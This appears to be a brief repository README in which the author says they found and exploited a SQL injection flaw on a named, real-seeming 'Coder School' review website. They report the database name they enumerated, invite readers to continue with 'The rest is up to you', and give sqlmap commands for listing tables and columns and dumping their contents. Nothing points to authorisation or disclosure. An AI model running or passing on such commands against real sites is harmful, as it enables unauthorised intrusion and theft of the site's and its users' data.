# Coder-School-SQLi-Result

There is a SQL injection vulnerability on the Coder School review website.  I exploited it to find all of the tables.  The main database is AppServer(The only other one was information_schema).  The rest is up to you.



P.S.  If you want to dump the tables in there, or dump the columns in the tables, do the following commands:
  
  sqlmap -u [URL of the review page] -D AppServer --tables
  
  sqlmap -u [URL of the review page] -D AppServer -T [Name of the table] --columns
  
  sqlmap -u [URL of the review page] -D AppServer -T [Name of the table] -C [Name of the Column] --dump
